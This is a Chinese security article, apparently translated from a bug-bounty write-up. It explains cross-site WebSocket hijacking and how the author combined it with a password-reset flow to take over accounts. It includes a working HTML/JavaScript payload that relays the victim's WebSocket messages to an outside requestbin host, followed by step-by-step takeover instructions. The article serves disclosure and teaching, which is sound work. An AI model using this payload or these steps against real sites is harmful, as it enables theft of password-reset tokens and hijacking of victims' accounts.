***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

**![xxx.jpg](https://image.3001.net/images/20190314/1552555063_5c8a1c37b8c72.jpg!small)**
**本文分享的是作者在某次漏洞测试中，由于目标应用使用了WebSocket协议，经测试后，存在跨站WebSocket劫持漏洞。之后，作者利用该漏洞结合用户密码重置功能，实现了对目标应用注册账户的账户劫持攻击。**

## WebSocket技术和跨站WebSocket劫持攻击导读

为了更好地理解WebSocket 技术，在此，我们参考了IBM Developer社区《[深入理解跨站点 WebSocket
劫持漏洞的原理及防范](https://www.ibm.com/developerworks/cn/java/j-lo-websocket-cross-site/index.html)》一文，对WebSocket 技术和跨站点 WebSocket劫持漏洞做了大概的梳理。

### WebSocket协议技术

WebSocket 是 HTML5 推出的新协议，跟 HTTP 协议内容本身没有关系。WebSocket 是持久化的协议，而 HTTP
是非持久连接。WebSocket 提供了全双工沟通，俗称 Web 的 TCP 连接，且WebSocket 基于 TCP 实现了消息流。WebSocket
也类似于 TCP 一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手，它在客户端和服务器之间提供了一个基于单
TCP 连接的高效全双工通信信道。通信协议从 http://或 https://切换到 ws://或
wss://后，表示应用已经切换到了WebSocket协议通信状态。

对于实时性要求比较高的应用而言，譬如在线证券、在线游戏，以及不同设备之间信息同步。信息实时同步一直是技术难题，在 WebSocket
出现之前，常见解决方案一般就是轮询（Polling）和 Comet
技术，但这些技术增加了设计复杂度，也造成了网络和服务器的额外负担，在负载较大的情况下效率相对低下，导致应用的可伸缩行收到制约。对于此类应用的开发者来说，WebSocket
技术简直就是神兵利器，详细可登陆 websocket.org 网站查看具体应用案例。

### 跨站WebSocket劫持漏洞

例如，以下是websocket.org 网站和其Echo
测试服务器echo.websocket.org之间，从HTTP到WebSocket协议升级切换的握手请求和响应。

WebSocket 协议切换请求：

    
    
    GET ws://echo.websocket.org/?encoding=text HTTP/1.1
    Host: echo.websocket.org
    Connection: Upgrade
    Pragma: no-cache
    Cache-Control: no-cache
    Upgrade: websocket
    Origin: http://www.websocket.org
    Sec-WebSocket-Version: 13
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) Chrome/49.0.2623.110
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6
    Cookie: _gat=1; _ga=GA1.2.2904372.1459647651; JSESSIONID=1A9431CF043F851E0356F5837845B2EC
    Sec-WebSocket-Key: 7ARps0AjsHN8bx5dCI1KKQ==
    Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits

Connection：Upgrade 和 Upgrade：websocket 这两行，相当于告诉服务器端：我要申请切换到 WebSocket 协议。

WebSocket 协议切换响应：

    
    
    HTTP/1.1 101 Web Socket Protocol Handshake
    Access-Control-Allow-Credentials: true
    Access-Control-Allow-Headers: content-type
    Access-Control-Allow-Headers: authorization
    Access-Control-Allow-Headers: x-websocket-extensions
    Access-Control-Allow-Headers: x-websocket-version
    Access-Control-Allow-Headers: x-websocket-protocol
    Access-Control-Allow-Origin: http://www.websocket.org
    Connection: Upgrade
    Date: Sun, 03 Apr 2016 03:09:21 GMT
    Sec-WebSocket-Accept: wW9Bl95VtfJDbpHdfivy7csOaDo=
    Server: Kaazing Gateway
    Upgrade: websocket  
    

一旦服务器端返回 101 响应，即可完成 WebSocket 协议切换。服务器端即可以基于相同端口，将通信协议从 http://或 https://切换到
ws://或 wss://。协议切换完成后，浏览器和服务器端即可以使用 WebSocket API 互相发送和收取文本和二进制消息。  

从以上请求响应消息中可以看到，WebSocket 协议没有规范 Origin 必须相同，没有指定“Access-Control-Allow-Origin”，也没有规定服务器在握手阶段应该如何认证客户端身份，跨域资源共享 Cross-Origin Resource
Sharing（CORS）机制并不适用WebSocket
协议。所以在此来说，攻击者可以伪造握手请求来绕过身份认证，最终实现的效果就是跨站点WebSocket劫持攻击（Cross-Site WebSocket
Hijacking，CSWH）。

## 发现跨站WebSocket劫持漏洞

有了以上对跨站点WebSocket劫持攻击的理解，作者在某邀请测试项目中，发现了某个使用了WebSocket协议连接的应用，在分析了WebSocket
URL之后，作者发现其存在跨站WebSocket劫持漏洞。

假设某个应用用wss://website.com的方式建立起了WebSocket协议通道，要验证它是否存在跨站WebSocket劫持漏洞，可以遵循以下几个步骤：

1、在浏览器中打开目标Web应用页面；

2、在浏览器新选项卡中访问<http://websocket.org/echo.html>这个测试页面，在其中的Location处输入上述目标应用的WebSocket
URL- wss://website.com，点击 ‘Connect’连接；

![利用跨站WebSocket劫持（CSWH）实现账户劫持](https://image.3001.net/images/20190314/1552554538_5c8a1a2a3bb4f.png!small)3、一旦和目标WebSocket
URL建立起了WebSocket连接，就可以通过该测试页面向目标服务器中发送数据。在该过过程，我们可以利用BurpSuite来抓取有效连接的websocket数据session包，然后，通过更改origin头的方式进行包重放，查看目标服务器的响应情况。如果重放后服务器的响应与前面有效session发送的正常包相同，那就说明该应用可能存在跨站WebSocket劫持漏洞。

当然，还可以利用跨站点WebSocket劫持漏洞检测网站 -<http://ironwasp.org/cswsh.html>，来确定该漏洞是否存在。通过以上几个步骤的检测分析，最终我发现该应用存在跨站WebSocket劫持漏洞。

## 利用跨站WebSocket劫持漏洞劫持账户

当我在浏览器中和目标应用建立起WebSocket连接之后，我就能获取到类似以下的WebSocket响应数据包：

![利用跨站WebSocket劫持（CSWH）实现账户劫持](https://image.3001.net/images/20190314/1552554654_5c8a1a9e33e2a.png!small)仔细查看上图，可以发现，其中包含了一个名为
“_forgotPasswordId” 且值为“null”的参数，所以，现在我们需要来确定这个 “_forgotPasswordId”
的值，看看能否对它进行利用。对应的，我在浏览器中，用https方式，输入了目标应用相关的某个注册邮箱对应用户的忘记密码功能页面，如下：

![利用跨站WebSocket劫持（CSWH）实现账户劫持](https://image.3001.net/images/20190314/1552554672_5c8a1ab059481.png!small)之后，我查看此时的WebSocket响应数据包时，它为forgotPassword带了一个token，很明显，这表示我的此次操作得到了服务端验证。

![利用跨站WebSocket劫持（CSWH）实现账户劫持](https://image.3001.net/images/20190314/1552554963_5c8a1bd3c1200.png!small)所以，这种跨站WebSocket劫持和密码重置功能的组合，可以充分利用形成对目标应用特定用户的账户劫持。为此，我写了以下的Payload脚本CSWH.html，用XHR方式向目标应用服务端发送WebSocket连接请求：

    
    
       <!-- Reference http://www.websocket.org/echo.html -->
    <!DOCTYPE html>
       <meta charset="utf-8" />
       <title>Testing</title>
       <script language="javascript" type="text/javascript">
       var wsUri = "wss://host.com";
       var output;
       function init()
       {
      output = document.getElementById("output");
      testWebSocket();
       }
       function testWebSocket()
       {
      websocket = new WebSocket(wsUri);
      websocket.onopen = function(evt) { onOpen(evt) };
      websocket.onclose = function(evt) { onClose(evt) };
      websocket.onmessage = function(evt) { onMessage(evt) };
      websocket.onerror = function(evt) { onError(evt) };
       }
       function onOpen(evt)
       {
      writeToScreen("CONNECTED");
      doSend('websocket frame ');
       }
       function onClose(evt)
       {
      writeToScreen("DISCONNECTED");
       }
       function onMessage(evt)
       {
     
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "http://requestbin.fullcontact.com/1143n2w1", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     xhr.send(evt.data);
      websocket.close();
       }
       function onError(evt)
       {
      writeToScreen('<span style="color: red;">ERROR:</span> ' + evt.data);
       }
       function doSend(message)
       {
      writeToScreen("SENT: " + message);
      websocket.send(message);
       }
       function writeToScreen(message)
       {
      var pre = document.createElement("p");
      pre.style.wordWrap = "break-word";
      pre.innerHTML = message;
      output.appendChild(pre);
       }
       window.addEventListener("load", init, false);
       </script>
       <h2>WebSocket Test</h2>
       <div id="output"></div>  
    

账号劫持步骤：

1、把目标应用的正常密码重置请求页面发送给受害者；

2、在攻击者网站托管上述CSWH.html，把该html访问链接也发送受害者；

3、一旦受害者分别点击了上述两个URL链接之后，攻击者端就能通过数据包监听方式获取到目标应用服务端对此次密码重置的Websocket响应消息，如下：

![利用跨站WebSocket劫持（CSWH）实现账户劫持](https://image.3001.net/images/20190314/1552554910_5c8a1b9e27e32.png!small)4、利用其中的密码重置token，我们就能向目标应用服务端伪造请求，实现对受害者账户的密码重置，以此实现对其账户劫持。

 ***参考来源：[medium](https://medium.com/@sharan.panegav/account-takeover-using-cross-site-websocket-hijacking-cswh-99cf9cea6c50)，clouds编译，转载请注明来自FreeBuf.COM**

